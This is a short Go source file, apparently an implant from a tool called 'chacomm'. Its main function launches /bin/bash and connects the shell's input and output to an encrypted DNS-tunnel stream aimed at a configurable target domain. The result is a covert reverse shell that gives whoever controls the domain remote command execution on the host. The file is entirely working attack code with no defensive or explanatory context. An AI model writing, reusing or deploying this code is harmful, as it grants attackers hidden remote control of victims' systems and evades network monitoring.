package main

import (
	"chacomm/transport"
	"os/exec"
)

var (
	targetDomain string
	encryptionKey string
)


func main(){
	RunShell()
}

func RunShell(){

	cmd := exec.Command("/bin/sh", "-c", "/bin/bash")

	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)

	cmd.Stdout = dnsTransport
	cmd.Stderr = dnsTransport
	cmd.Stdin = dnsTransport
	cmd.Run()

}
